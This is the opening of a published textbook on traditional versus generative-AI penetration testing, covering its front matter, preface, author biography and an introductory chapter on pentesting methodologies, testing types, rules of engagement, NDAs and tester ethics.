Traditional vs Generative

AI Pentesting

Traditional vs Generative AI Pentesting: A Hands-On Approach to Hacking explores the evolving landscape of penetration testing, comparing traditional methodologies with the

revolutionary impact of Generative AI. This book provides a deep dive into modern hacking

techniques, demonstrating how AI-driven tools can enhance reconnaissance, exploitation,

and reporting in cybersecurity assessments.

Bridging the gap between manual pentesting and AI automation, this book equips read-

ers with the skills and knowledge to leverage Generative AI for more efficient, adaptive, and intelligent security testing. By blending practical case studies, hands-on exercises, and theoretical insights, it guides cybersecurity professionals, researchers, and students through the next generation of offensive security strategies.

The book offers comprehensive coverage of key topics, including:

• Traditional vs AI-Driven Pentesting: Understanding the evolution of security testing

methodologies

• Building an AI-Powered Pentesting Lab: Leveraging Generative AI tools for reconnais-

sance and exploitation

• GenAI in Social Engineering and Attack Automation: Exploring AI-assisted phishing,

deepfake attacks, and deception tactics

• Post-Exploitation and Privilege Escalation with AI: Enhancing persistence and lateral

movement techniques

• Automating Penetration Testing Reports: Utilizing AI for streamlined documentation

and risk analysis

This book is an essential resource for ethical hackers, cybersecurity professionals, and aca-demics seeking to explore the transformative role of Generative AI in penetration testing.

It provides practical guidance, in-depth analysis, and cutting-edge techniques for mastering AI-driven offensive security.





Traditional vs Generative

AI Pentesting

A Hands-On Approach to Hacking

Yassine Maleh





Designed cover image: Shutterstock Image ID 2396701649

First edition published 2026

by CRC Press

2385 NW Executive Center Drive, Suite 320, Boca Raton FL 33431

and by CRC Press

4 Park Square, Milton Park, Abingdon, Oxon, OX14 4RN

CRC Press is an imprint of Taylor & Francis Group, LLC

© 2026 Yassine Maleh

Reasonable efforts have been made to publish reliable data and information, but the author and publisher cannot assume responsibility for the validity of all materials or the consequences of their use. The authors and publishers have attempted to trace the copyright holders of all material reproduced in this publication and apologize to copyright holders if permission to publish in this form has not been obtained. If any copyright material has not been acknowledged please write and let us know so we may rectify in any future reprint.

Except as permitted under U.S. Copyright Law, no part of this book may be reprinted, reproduced, transmitted, or utilized in any form by any electronic, mechanical, or other means, now known or hereafter invented, including photocopying, microfilming, and recording, or in any information storage or retrieval system, without written permission from the publishers.

For permission to photocopy or use material electronically from this work, access www. copyright. com or contact the Copyright Clearance Center, Inc. (CCC), 222 Rosewood Drive, Danvers, MA 01923, 978-750-8400. For works that are not available on CCC please contact mpkbookspermissions@tandf.co.uk

Trademark notice: Product or corporate names may be trademarks or registered trademarks and are used only for identification and explanation without intent to infringe.

ISBN: 978-1-041-07045-0 (hbk)

ISBN: 978-1-041-07399-4 (pbk)

ISBN: 978-1-003-64031-8 (ebk)

DOI: 10.1201/9781003640318

Typeset in Sabon

by SPi Technologies India Pvt Ltd (Straive)





To the loving memory of my dear mother, whose unwavering strength, wisdom, and kindness continue to inspire me every day.

Your guidance shaped my journey, your sacrifices paved my path, and your love

remains my greatest source of strength. Though you are no longer here, your

presence is felt in every achievement, every challenge overcome, and every step

forward.

This book is a tribute to you—a reflection of the values you instilled in me and the

passion you encouraged me to pursue.





Contents

Preface

viii

About the author

x

1 Foundations of pentesting: Methodologies, frameworks, and AI integration

1

2 Building a modern penetration testing lab with generative AI

34

3 GenAI-driven reconnaissance for effective penetration testing

50

4 GenAI-enhanced scanning and sniffing

103

5 Vulnerability assessment: Tools, techniques, and GenAI integration

144

6 AI-driven social engineering and penetration testing

183

7 GenAI-driven exploitation testing techniques

220

8 Post-exploitation techniques and AI-driven privilege escalation

257

9 GenAI for automating and enhancing penetration testing reports

292

Index

303

vii





Preface

In a world where numerous facets of daily life depend on digital systems, cybersecurity has emerged as the foundation of trust and functionality. As technology advances, so too does the methodology of attackers, who increasingly exploit sophisticated tools intended to enhance

our lives. Generative AI has transitioned from being lauded as a transformative advance-

ment in innovation to becoming integral to cybersecurity, thereby presenting both significant opportunities and novel challenges.

Traditional vs Generative AI Pentesting: A Hands-On Approach to Hacking addresses this intriguing yet intricate field, providing readers with foundational knowledge of generative AI and revealing its potential implications in penetration testing and ethical hacking. This book establishes a link between artificial intelligence and cybersecurity to assist professionals in remaining proactive in the ever-evolving threat landscape.

This document provides comprehensive insights into the transformative impact of

Generative AI on penetration testing. A plethora of practical strategies, encompassing the

automation of reconnaissance, the application of adversarial attacks, and the creation of

synthetic datasets for testing purposes. This book caters to seasoned pentesters, machine

learning enthusiasts delving into cybersecurity, and inquisitive individuals interested in the future of hacking. This is your guide for optimizing the tools and techniques that are shaping the domain of cybersecurity.

The content is structured as follows:

• Introduction to Generative AI in Cybersecurity: An overview of Generative AI’s poten-

tial and ethical considerations in penetration testing.

• Foundations of Generative AI: A technical dive into key AI architectures and their

applications in cybersecurity.

• AI-Powered Reconnaissance and Information Gathering: Strategies for leveraging

Generative AI to enhance OSINT and reconnaissance efforts.

• Automating Social Engineering Attacks: Insights into how Generative AI can simulate

phishing and other social engineering techniques.

• Exploiting Vulnerabilities with AI: How Generative AI aids in generating payloads,

fuzzing, and bypassing defenses.

• Synthetic Data for Red Teaming: Leveraging AI to create realistic environments for

simulation and testing.

• Countering AI-Powered Attacks: Techniques to defend against adversaries utilizing AI

in cyberattacks.

• Ethical and Legal Considerations: A critical look at responsible AI usage and its ethical boundaries in cybersecurity.

• Future Trends in Generative AI for Cybersecurity: Predictions and emerging challenges

at the intersection of AI and penetration testing.

viii

Preface ix

With real-world examples, hands-on exercises, and in-depth discussions, this book provides

both the theoretical foundation and the practical tools needed to incorporate Generative AI into penetration testing workflows effectively.

Upon completing this book, you will gain insight into how Generative AI is transforming

penetration testing, as well as the practical application of these innovative techniques in a safe and effective manner. Our objective is clear: to provide you with sufficient tools and knowledge to remain ahead of emerging cyber threats today and in the future. Together, we

can establish a more secure and resilient digital environment.

Are you prepared to commence? This is your chance for an intriguing exploration of

Generative AI and the field of penetration testing. Take my hand and let us embark on a

journey together into the future of cybersecurity.





About the author

Yassine Maleh has been an associate professor of cybersecurity at Sultan Moulay Slimane University, Morocco, since 2019. He has a double PhD in Cybersecurity and IT Management.

He is the founding chair of IEEE Consultant Network Morocco and founding president of

the African Research Center of Information Technology & Cybersecurity. He is a former

CISO at the National Port Agency between 2012 and 2019. He is a senior member of IEEE

and a member of the International Association of Engineers IAENG and Machine Intelligence

Research Labs. Dr Maleh has made contributions in the fields of information security and

privacy, Internet of things security, and wireless and constrained networks security. His

research interests include information security and privacy, Internet of things, networks

security, information system, and IT governance. He has published over than 250 papers

(international journals, book chapters, and conferences/workshops), 40 edited books, and 6

authored books. He is the editor-in-chief of the International Journal of Information Security and Privacy (IJISP, IF: 0.8), and the International Journal of Smart Security Technologies (IJSST). He serves as an associate editor for IEEE Access, since 2019 (Impact Factor 4.098), the International Journal of Digital Crime and Forensics (IJDCF), and the International Journal of Information Security and Privacy (IJISP). He is a series editor of Advances in Cybersecurity Management, by CRC Press/Taylor & Francis. He was also a guest editor for many special issues with prestigious journals ( IEEE Transactions on Industrial Informatics, IEEE Engineering Management Review, Sensors, and Big Data Journal). He has served and continues to serve on executive and technical program committees, as well as a reviewer of

numerous international conferences and journals such as Elsevier Ad Hoc Networks, IEEE

Network Magazine, IEEE Sensor Journal, ICT Express, and Springer Cluster Computing. He was the General chair and publication chair of many international conferences (BCCA 2019,

MLBDACP 19, ICI2C’21, ICACNGC 2022, CCSET’22, IEEE ISC2 2022, ISGTA’24, etc.). He

received Publons Top 1% reviewer award for the years 2018 and 2019. He holds numerous

certifications demonstrating his knowledge and expertise in the field of cybersecurity from major organizations such as ISC2, Fortinet, CEH, Cisco, IBM, Microsoft, CompTIA, and

others.

x





Chapter 1

Foundations of pentesting

Methodologies, frameworks, and AI integration

INTRODUCTION

In modern times, where the digital ecosystem drives many aspects of contemporary living,

trustworthiness is significantly influenced by cybersecurity. As cyber threats increase in various forms and complexities, organizations must respond proactively to those threats that

jeopardize their digital assets. Among such proactive measures, penetration testing (PT)

emerges as one of the key practices to calibrate and strengthen the defensive strategy of an organization. PT applies real-world experiences in cyberattack simulations, combining vulnerability identification with resilience assessments of networks, applications, and systems (Maleh, 2024).

This chapter examines the foundational methodologies, frameworks, and the interplay of

artificial intelligence (AI) in modern practices of PT. In contrast to vulnerability assessments or security audits, PT relies on an offensive technique that aims to examine a computer for weaknesses that could be exploited by malicious actors. Equally important to PT are its ethical and legal aspects; to ensure accountability and clarity in testing activities, appropriate RoE and NDAs must be set up. This chapter presents an overview of core methodologies

and frameworks, including OWASP, MITRE ATT&CK, PTES, and the Cyber Kill Chain.

These frameworks represent structured methodologies of PT that standardize individual

approaches to managing cybersecurity problems, and their interconnectedness forms a foun-

dation for addressing increasingly sophisticated cyber threats. This chapter further analyzes how integrating AI tools into PT will transform the field, driving exponential growth in performance, precision, and scalability.

Evolving traditional PT techniques and emerging AI capabilities are central to the focus

of this chapter. The rise of sophisticated AI-driven tools presents unprecedented opportunities for the automation of reconnaissance, vulnerability identification, and adversarial attack simulation (Zaydi & Maleh, 2024). However, these advantages also bring numerous ethical challenges that stem from AI applications which will require additional industry regulations.

Central to this chapter is the need to counterbalance innovations with their responsibilities, ensuring that AI-driven PT practices adhere to ethical guidelines and do not pose a risk of becoming operational weapons in the hands of ill-intentioned parties.

Apart from technical points of interest, this chapter emphasizes how PT supports the stra-

tegic goals of an organization. By aiding in the identification of vulnerabilities and determining the effectiveness of security measures, PT enables organizations to safeguard their

critical assets, minimize risks, and ensure compliance with regulatory frameworks. Moreover, incorporating AI into PT workflows enhances these benefits, such as employing predictive

analytics, real-time threat detection, and continuous monitoring.

Penetration testing will continue to remain a practice that organizations do desperately

in order to stave off potential threats and attacks. This chapter amalgamates an exhaustive DOI: 10.1201/9781003640318-1

1





2 Traditional vs Generative AI Pentesting

survey of methodologies, frameworks, and innovations driven by artificial intelligence in

modern PT. In helping readers utilize the strengths of AI and understand the implications

therein, this chapter empowers cybersecurity professionals to address the challenges posed

by the contemporary threat landscape and hence build a more resilient future-ready defense.

What is PT?

In security evaluation, PT is more critical than vulnerability assessments. Vulnerability scanning examines individual devices, applications, or computers within a network, whereas PT

provides a comprehensive overview of the network’s security framework (Bishop, 2007).

Through PT, executives, managers, and administrators of computer networks may observe

the potential consequences of a legitimate hacker into their accounts. Additionally, they can highlight security vulnerabilities that standard evaluations overlook.

If the penetration tester has expertise in social engineering, they can assess whether employees are prone to granting unauthorized individuals access to the office or the network. The PT

is a security assessment that measures a company’s effectiveness in safeguarding its network, applications, systems, and personnel from internal and external threats.

Conducting a "penetration test" or "Pentest" is a method to assess the security of a computer network. It is a proactive method to assess the efficacy of an organization’s infrastructure protection by simulating real attacks.

A penetration test systematically evaluates security protocols for weaknesses, design flaws, and technology deficiencies.

Test outcomes are recorded and conveyed in a detailed report for management and

technicians.

Benefits of conducting a PT

• Assess the probability of information assets being targeted and implement effective

safeguards.

• Ensure that the organization adheres to permitted limits for information security risk.

• This tool may provide a more accurate evaluation of the commercial impact of an

assault and the feasibility of various attack paths.

• Provides a comprehensive framework for preemptive measures that may be undertaken

to prevent future exploitation.

• Optimizes the advantages of investments in information technology security by ensur-

ing the effective implementation of security protocols.



• Compliance with all relevant industry regulations and standards (e.g., ISO/IEC

27001:2022, PCI DSS, HIPAA, FISMA) (Maleh, Y., Sahid, A., Alazab, M., & Belaissaoui,

2021).

• Focuses on significant vulnerabilities and emphasizes security issues at the application level for management and development teams.

• Evaluate the effectiveness of web servers, firewalls, and routers as security mechanisms for a network.

Revealing vulnerabilities: A penetest identifies vulnerabilities in a company’s systems and applications while also assessing the potential for employee-induced data

breaches. The tester delivers a report detailing current security vulnerabilities along

with recommendations and guidelines to improve overall security.

Show real risks: The tester emulates the behavior of a genuine attacker by leveraging identified vulnerabilities.





Foundations of pentesting 3

Ensuring business continuity: A little disturbance might significantly impact a firm.

The enterprise may incur losses amounting to hundreds, if not thousands, of dol-

lars. Consequently, it is imperative for the company’s operations that the network

is perpetually accessible, resources are readily available, and communications are

consistently operational. A penetration test identifies potential vulnerabilities and

recommends solutions to safeguard the business’s operations from unforeseen dis-

ruptions or loss of access.

Reduce client-side attacks: An attacker can exploit client-side vulnerabilities in online forms and web services to gain access to a company’s systems. Enterprises must be

prepared to safeguard their systems against such attacks. If a firm recognizes the

common threats it may encounter, it may proactively enhance its application to

address identified weaknesses.

Establish the company’s safety status: One method to ascertain the security of a company is to employ the PT. The tester provides an overview of the company’s infra-

structure protection, evaluates the effectiveness of existing security measures, and

identifies the overall security system along with areas requiring enhancement.

Preserving the company’s reputation: Companies must strive to maintain their esteemed reputations among clients and business allies. Following a data breach or attack,

even the most loyal partners may hesitate to continue supporting the business anew.

Safeguarding sensitive information and preserving reputation with clients and busi-

ness partners requires regular PT.

Comparison of security audit vulnerability assessment and PT

These approaches encompass security audits, vulnerability assessments, and PT, employed to

evaluate the security of a computer system in compliance with stringent laws. Nonetheless,

each possesses distinct qualities and objectives.

According to Sabillon et al. (2017), a security audit is a systematic process for analyzing and assessing the security of an IT system. It is typically done using various recognized standards and best practices, for instance, ISO 27001 (Malatji, 2023). The security audit scrutinizes the security policies, procedures, and controls to understand the weaknesses, risks, gaps, and more. The security audit gives an overall assessment of an IT system’s security but does not give details regarding specific vulnerabilities.

It is a way to scan a computer system to find identified and other potential vulnerabili-

ties. In short, this technique deploys automated tools to scan open ports, running services, and known vulnerabilities (Samtani et al., 2016). The vulnerability assessment is usually conducted using vulnerability scanning software, which compares the information obtained

against a database of known vulnerabilities. The assessment prioritizes the results of the vulnerability assessment such that the most threatening vulnerabilities are mitigated or patched first.

Penetration testing is a sophisticated method that simulates a genuine assault on a com-

puter system to identify further vulnerabilities in its security. Penetration testing may be conducted either manually or with various automated methods. Pentest employs attack tactics

akin to those of hackers, and operates within a regulated and ethical framework. The pen-

etration test findings enumerate identified vulnerabilities and security shortcomings, along with recommendations for remediation.

Consequently, the security audit provides a comprehensive evaluation of an IT system’s

security state, the vulnerability assessment identifies possible vulnerabilities inside the system, and PT replicates an actual assault to ascertain security weaknesses. These approaches





4 Traditional vs Generative AI Pentesting

Security Audit

Vulnerability

Pentesting

•Ethical Hacking

•A security audit

assessment

•Penetration testing

•Ethical hackers

checks whether

•A vulnerability

is a

are hired by

an organization is

assessment

methodological

organizations to

following a set of

focuses on the

approach to

simulate real-life

standard security

discovery of

security

attacks and

policies and

vulnerabilities in

assessment that

attempt to

procedures.

an information

encompasses

penetrate their

system, but

security auditing

systems, networks

provides no

and vulnerability

and applications to

indication of

assessment, and

find vulnerabilities

whether these

demonstrates

that malicious

vulnerabilities can

whether a

hackers could

be exploited, or

system's

exploit.

how much

vulnerabilities can

damage could

be successfully

result from

exploited by

successful

attackers.

exploitation of

these

vulnerabilities.

Figure 1.1 Difference between security audit, vulnerability assessment, and PT.

are frequently employed in conjunction to deliver a comprehensive security evaluation of a

computer system. Figure 1.1 delineates the distinctions among a security audit, vulnerability assessment, and PT.

Pentesting vs ethical hacking

• Penetration testing is an authorized, methodical procedure that uses known vulnerabili-

ties to try access to a system, network, or application resources.

• Penetration testing seeks to uncover system vulnerabilities and recommend remedial

actions prior to their detection and exploitation by hackers or cybercriminals.

• Penetration testing may be conducted internally (with partial access to the organiza-

tion’s information system) or externally (without access to the organization’s informa-

tion system). This often entails employing automated or manual instruments to evaluate

the organization’s assets.

• It is essential to recognize that PT is distinct from both hacking and ethical hacking.

Pentesting benefits

• Identifying vulnerabilities: A penetration test not only uncovers current deficiencies in system or application setups but also evaluates the activities and behaviors of an organization’s workers that may result in a data leak. The tester delivers a report including





Foundations of pentesting 5

updates on security vulnerabilities along with recommendations and rules designed to

enhance overall security.

• Exhibit the actual hazards: The tester utilizes discovered vulnerabilities to ascertain

potential behaviors of a genuine attacker.

• Guarantee operational continuity: A minor disruption may significantly affect a corpo-

ration. It may incur expenses for the firm up to tens or even thousands of dollars. Thus,

network availability, resource accessibility, and round-the-clock communication are

vital for the seamless operation of the organization. A penetration test identifies pos-

sible vulnerabilities and proposes remedies to safeguard corporate operations against

unforeseen disruptions or accessibility losses.

• Mitigate client-side attacks: An assailant can infiltrate a company’s systems from the

client side, especially through web services and online forms. Organizations must be

equipped to safeguard their systems against such assaults. If a corporation is aware of

the types of threats it may encounter, it can identify the warning indications and should

be capable of updating the program accordingly.

• Assess the company’s security status: Penetration testing can ascertain a company’s

security level and overall security status. The tester delivers a report on the company’s

comprehensive security system and identifies opportunities for enhancement, detailing

the safeguarding of its infrastructure and the efficacy of current security measures.

• Safeguarding the company’s reputation: An organization must keep a positive reputa-

tion with its partners and clients. Gaining the faith and support of even steadfast part-

ners becomes challenging when a firm has a data breach or cyberattack. Organizations

must do frequent penetration testing to safeguard their data and maintain the confi-

dence of their partners and consumers.

PT strategies

Intrusion testing can be carried out using three approaches:

• Black box PT is conducted under circumstances that closely resemble an external

assault by an unidentified remote attacker. This indicates that the penetration testers

receive minimal or no knowledge prior to commencing the assessment.

• The white box PT is conducted with comprehensive information provided to the pen-

testers prior to the assessment. The information necessary for the penetration test is

supplied with total transparency. The action of the target is then disclosed and rendered

apparent, thus the white box.

• Gray box PT is conducted with minimal information provided to the testers prior to the

assessment. This may entail supplying information on the functionality of the target,

granting user accounts on a platform with limited access, and providing access to a

target that is not publicly available, among other actions. This facilitates more compre-

hensive testing and an enhanced comprehension of the situation.

Black-box penetration testing

• The penetration tester doing the black-box assessment has no prior knowledge of the

target infrastructure.

• The tester possesses limited knowledge of the target firm. Following comprehensive

research and data acquisition, the penetration test may be executed.





6 Traditional vs Generative AI Pentesting

• This test collects publicly available information, including domain and IP addresses,

and then simulates the hacking process.

• Assessing the infrastructure’s attributes and interrelations occupies a substantial seg-

ment of the project timetable.

• It is neither inexpensive nor time-efficient.

White-box penetration testing

• The tester receives extensive information on the infrastructure to be evaluated.

• This examination is structured to replicate the operational methods of a company’s

workforce.

• It swiftly uncovers security deficiencies and vulnerabilities.

• The tester will evaluate all necessary components, since he is acutely aware of what to

examine.

Gray-box penetration testing

• Gray-box employs both white-box and black-box PT approaches.

• In gray-box testing, the tester often possesses limited information.

• All requisite safety testing and assessments are performed internally.

• They seek vulnerabilities that an assailant may use to undermine a program.

• Black-box testing of secure systems is a standard procedure to check if the tester identifies that specific background information is essential for the test’s accuracy.

Pentesting vs red teaming

Red Teaming and Penetration Testing are two methodologies in information technology

security designed to evaluate the security of a system or network. Despite their similarities, significant differences exist between the two.

Pentesting, or penetration testing, evaluates system or network’s security through simu-

lated attacks. The objective is to identify vulnerabilities and security deficiencies that could be exploited by an adversary. Penetration testing frequently employs automated tools, including vulnerability scanners, alongside manual testing to uncover vulnerabilities that automated

methods may overlook. The outcomes of these assessments enable organizations to enhance

their security stance by addressing identified vulnerabilities. Red teaming, conversely, constitutes a more extensive methodology that entails the simulation of a genuine attack. Red

Teams consist of IT security specialists who attempt to infiltrate a system or network employing authentic attack methodologies, including social engineering, email deception, network

reconnaissance, and vulnerability exploitation, among others. Red Teams collaborate with

organizations to evaluate their resilience against complex and realistic assaults. The objective is to evaluate the organization’s capacity to detect, prevent, and respond to an actual attack, as well as to identify areas for enhancement.

The decision between red teaming and penetration testing is contingent upon the organi-

zation’s IT security maturity and objectives. For a company that is relatively inexperienced in IT security and seeks to routinely evaluate its security posture, penetration testing may serve as an effective initial measure. Penetration testing can identify superficial vulnerabilities and prevalent misconfigurations, while also offering actionable recommendations to enhance

enterprise security. Nonetheless, if the organization possesses a well-established security strategy and seeks to evaluate the robustness of its defenses, red teaming may be a more suitable alternative. Red teaming can effectively simulate realistic scenarios of advanced attacks that





Foundations of pentesting 7

incorporate sophisticated tactics, techniques, and procedures (TTPs). Moreover, red teaming can assist in identifying deficiencies in organizational security, including security policies, incident management protocols, and employee training programs.

Common areas of penetration testing

1. PT network

◦ Assists in identifying security vulnerabilities in network architecture and execution.

◦ Prevalent network security issues

◦ Utilization of insecure protocols

◦ Unutilized open ports and services

◦ Unpatched operating system and applications

◦ Improper configuration of firewalls, intrusion detection systems (IDS), servers,

workstations, network services, etc.

2. PT web applications

◦ Facilitates the identification of security vulnerabilities in web applications resulting from inadequate design and development methodologies.

◦ Prevalent vulnerabilities in web application security

◦ Injection vulnerabilities

◦ Failures in authentication and authorization

◦ Inadequate session management

◦ Inadequate cryptography

◦ Inadequate error management

3. PT by social engineering

◦ Assists in identifying personnel who do not authenticate, adhere to, validate, and

manage procedures and technology appropriately.

◦ Prevalent employee behavioral issues might provide significant security threats to

the firm.

◦ Dissemination of deceptive electronic correspondence

◦ Fall prey to phishing emails and telephone calls

◦ Disclosing confidential information to unfamiliar individuals

◦ Permitting unlawful access to non-nationals

◦ Establishing a connection between a USB device and a workstation

4. PT wireless networks

◦ Assists in identifying settings inside wireless network systems.

◦ Prevalent security vulnerabilities in a wireless network framework

◦ Insecure wireless encryption protocols

◦ Unauthorized drug access points

◦ Inadequate encryption passphrase

◦ Unsupported wireless technology

5. PT mobile devices

◦ Facilitates the identification of security issues related to mobile devices and their

utilization. Prevalent security issues associated with mobile devices.

◦ Lack or inadequate execution of BYOD (Bring Your Own Device) policy

◦ Utilization of rooted or compromised mobile devices

◦ Inadequate security implementation on mobile devices





8 Traditional vs Generative AI Pentesting

6. PT in cloud

Assists in identifying security vulnerabilities inside cloud infrastructure (Maleh, 2023).

Alongside traditional security concerns, cloud services introduce distinct security chal-

lenges related to the cloud environment:

◦ Inadequate data security during storage

◦ Network connection and bandwidth issues in relation to minimal criteria.

◦ Inadequate user access management

◦ Unsecured interfaces and access points

◦ Inadequate secrecy of user activities in the cloud

◦ Insider security risks.

PT process

The PT method is often segmented into many phases to guarantee thorough and effective

evaluation. The stages may differ based on the employed technique; nevertheless, below is a standard five-step process:

Strategic planning and reconnaissance: The preliminary stage entails comprehending the PT’s goals and objectives. In the information-gathering phase, the tester aims to obtain

data on the target’s architecture, operating systems, applications, communication pro-

tocols, and possible entry points. This can be achieved via the use of automated tech-

nologies or human techniques, including public information searches, log analysis, and

others.

Vulnerability scanning: This step entails identifying the target’s vulnerabilities and weaknesses using automated tools and human methods. The tester may employ vulnerability

scanners, file explorers, fuzzing tools, and network traffic analysis tools to identify

potential entry points and vulnerabilities.

Exploitation and post-exploitation: At this phase, the tester leverages vulnerabilities to determine possible access to sensitive systems or information. The exploitation strategy

may differ depending on the vulnerability and circumstances, perhaps utilizing auto-

mated tools, bespoke scripts, or manual approaches.

Reporting: This phase involves documenting the results of the penetration test in a well-structured report. The report should be clear, concise, and logically organized to ensure

the findings and recommendations are easily understood. It must detail the method-

ologies used, tools employed, vulnerabilities discovered, and corresponding security

recommendations. This comprehensive documentation supports informed decision-

making for enhancing system security.

Cleanup and follow-up: Documenting the results of the PT requires presenting them in a well-structured report. The reports must be lucid, succinct, and systematically organized to effectively communicate findings and suggestions. They should also provide

details about the approaches used, tools employed, identified vulnerabilities, and secu-

rity suggestions.

Code of good practice

Penetration testing is permitted exclusively on approved systems and requires the explicit

approval of the system owner. Unapproved physical training results in considerable legal and ethical consequences.





Foundations of pentesting 9

Unethical and irresponsible action in ethical hacking and PT might result in adverse out-

comes. This chapter will examine ethical hacking protocols, highlighting the significance of ethics, transparency, and accountability.

The ethics of ethical hacking is grounded on moral principles to guarantee that the pro-

cedure is conducted with the highest degree of responsibility and legality. The ethical hacker must adhere to a code of behavior designed to ensure that this discipline delivers an ethical service. The following norms of behavior encompass:

• Refraining from employing any nefarious techniques to gain access to a computer sys-

tem or its information

• Adhering to relevant laws and regulations

• Securing prior authorization from the proprietor of the computer system

• Preserving the integrity of a computer system

• Honor user confidentiality

• Transparency: The ethical hacking movement is frequently defined by aspects of enigma

and confidentiality. For ethical hacking to attain societal acceptability, it must be guided by clear legal frameworks, professional ethics, and transparent practices that ensure

public trust.

• Communication: Ethical hackers must transparently disclose their operations and

engage with pertinent stakeholders, including IT system proprietors, security admin-

istrators, and users. They must go from first authorization to results reporting in a

completely communicative way with all stakeholders involved in the process.

Legal framework: Rules of Engagement (RoE)

Rules of Engagement (RoE) is a document that outlines the procedures for conducting the

penetration test. Certain parameters must be explicitly articulated in a Rules of Engagement document prior to commencing the penetration test.

Test type and framework: delineates the kind of penetration test (black box, white box,

gray box) according to the information supplied by the client.

Client contact information: collect contact details and escalation procedures in the event

of an issue or emergency. The customer-side technical staff must be accessible 24/7 during the duration of the penetration test.

Notification from the customer’s IT team: penetration tests are utilized to assess the overall preparedness of the IT team and specifically the cyber defense team in responding to events and intrusion attempts. It is essential to clarify if a penetration test is scheduled or unscheduled. For an advertised test, it is necessary to mention the day and time of the testing, along with the source IP addresses from which the test (attack) would be conducted. In the event

of an unannounced test, outline the procedure to be adhered to if identified or obstructed by a detection/prevention system.

Management of sensitive data: throughout the preparation and execution of tests, the

penetration testers may encounter or get sensitive information pertaining to the firm, its

systems, and/or its users. Managing sensitive data necessitates meticulous consideration in the engagement agreement, with the implementation of suitable storage and communication

protocols (e.g., complete disk encryption on the pentesters’ devices, encryption of reports transmitted via email, etc.). It is important to verify the alignment of the necessary tests and the designated framework with the applicable regulatory statutes to which the client is bound (GDPR, HDS, PCI …).





10 Traditional vs Generative AI Pentesting

Progress meetings and reporting: delineates the frequency of progress meetings with the

client and the reports to be produced during and/or upon the conclusion of the penetration

test.

Legal framework: Non-disclosure agreement (NDA)

A non-disclosure agreement (NDA) is a legal contract between two parties that stipulates

the obligation not to reveal secret information to third parties. A Non-Disclosure Agreement (NDA) is frequently employed to safeguard the client’s data and systems during testing in the realm of ethical hacking and penetration testing.

The NDA safeguards confidential information, including customer data, payment details,

trade secrets, and intellectual property. Ethical hackers and corporate customers must establish consensus on the information to be safeguarded and the measures to be implemented in

the event of a violation of the agreement.

The NDA must be formulated prior to the commencement of testing and executed by all

parties concerned. It may be incorporated into the comprehensive security services agreement or established as an independent contract.

Noncompliance with an NDA may result in significant legal repercussions, including litiga-

tion for damages. Corporate clients must guarantee that ethical hackers adhere to all non-

disclosure agreement stipulations to safeguard their information and systems. Figure 1.2

shows an example of a confidentiality NDA.

Understanding the restrictions

Upon defining the primary objectives, the team should analyze several elements related to

the testing process. Despite the assets and environment being delineated within the scope, the team must be cognizant of the constraints that may impact testing, including:

The team must ascertain what is being tested and what is not to refine the scope further. It is essential to ascertain the parameters of acceptable conduct during physical and social

engineering assessments.

The governing documents will delineate which locations, systems, applications, or other

potential targets are to be included or excluded based on the defined scope. A team

member may want to test an alternative subnetwork during the testing procedure. The

team member must specify that, for legal reasons, they cannot perform the test unless it

is expressly incorporated within the scope.

The particulars of the PenTest may further include other constraints, such as potential

geographical or technical limitations, to address these restrictions. A legacy system may

have a history of issues with automated scanning.

Minimize intrusiveness based on the defined scope—what is specifically under inquiry and

what is not? Activities such as physical security tasks and social engineering should be

classified as acceptable. Furthermore, the stakeholder is requested to delineate any con-

straints that may impact susceptible systems in the event of a planned invasive assault,

such as a Denial of Service (DoS) attack, during the testing phase.

Limit tool utilization to a singular engagement—in some instances, a regulatory body

mandates the tools that the team must employ during the assessment. In that scenario,

the group will receive a comprehensive overview of all available resources pertinent to

that particular activity.



Foundations of pentesting 11

Figure 1.2 Example of a non-disclosure agreement (NDA).

To ensure precise testing outcomes, the team must account for all pertinent elements. Is it feasible to reach the distant location utilizing existing technology if an installation in a foreign country must be included in the test? The parties must concur on the extent of travel required to conduct the PenTest at the remote site, should an on-site visit be deemed essential.





12 Traditional vs Generative AI Pentesting

Characteristics of a good PT

• Define physical therapy parameters, including aims, constraints, and rationale for

operations.

• Engage proficient, seasoned experts to conduct the assessment.

• Choose an appropriate array of assessments, weighing expenses against advantages.

• Adhere to a technique that incorporates suitable planning and documentation.

• Meticulously record the outcomes and ensure they are understandable to the client.

When should a PT be conducted?

To maintain a record of all existing and newly identified vulnerabilities that have been

addressed prior to exploitation by cybercriminals, the PT must be conducted often. Hackers

seem to be exploring novel methodologies and strategies, as seen by several recent reports

of new assaults. Any novel kind of aggression necessitates that a corporation be prepared

with treatments. Regrettably, the majority of firms neglect to consider the probability of such occurrences and defer doing PT until it becomes obligatory, either due to legal requirements or, more critically, following an assault.

Pentester ethics

• Execute PT solely upon obtaining the customer’s written authorization.

• Adhere to the stipulations of the contract, encompassing all responsibility and non-

disclosure clauses.

• Prior to conducting the PT test, evaluate the equipment in a different laboratory setting.

• Ensure the customer is informed of any potential risks associated with the testing.

• Immediately inform the customer upon the discovery of a highly vulnerable vulnerability.

• Kindly provide just the statistically summarized outcomes of the social engineering

assessment.

• The security guard and the cybercriminal should maintain a considerable distance from

one another.

PT methodologies

During the PT, specific systematic and reproducible procedures are utilized to guarantee the process’s efficacy. A multitude of techniques has been developed throughout the years, each with distinct advantages and limitations. This chapter concisely analyzes the primary PT

approaches, emphasizing their merits and drawbacks, and provides a comparative table to

aid in the selection of the most appropriate method for particular situations.

OSSTMM methodology

OSSTMM (Open Source Security Testing Methodology Manual) is an open-source method-

ology for PT that employs a holistic approach to information collecting, vulnerability assessment, PT, system takeover, information leaking, and test coverage (Giuseppi et al., 2019).

OSSTMM is generally employed in intricate PT scenarios and is organized into many phases

that function inside certain channels. Every channel has unique methods and phases, with

a broad structure that may vary in implementation details according to domain, techno-

logical, and legal limitations. The OSSTMM delineates four modules necessitating further

specification.





Foundations of pentesting 13

Phase I: Regulatory

• Evaluate posture: examine the relevant standards and regulatory frameworks.

• Logistics: document every process constraint inside the channel, encompassing both

technical and physical limitations.

• Validation of active detection: examining the identification and response to interactions.

Phase II: Definitions

• Conduct a visibility audit to evaluate the accessibility of information, systems, and

procedures pertinent to the goal.

• Access verification: assess target access points

• Evaluating trust: analyzing the trust connection between systems or individuals.

• Controls audit: assess controls to preserve confidentiality, integrity, and non-repudia-

tion inside systems.

Phase III: Information phase

• Conduct a process audit to evaluate the company’s safety protocols.

• Verification of configuration: testing protocols with differing levels of protection

• Asset evaluation: examine the organization’s tangible and intangible properties



• Analyzing segregation: assessing the degree to which sensitive data has been

compromised

• Exposure assessment: analyzing potential interaction with personal information

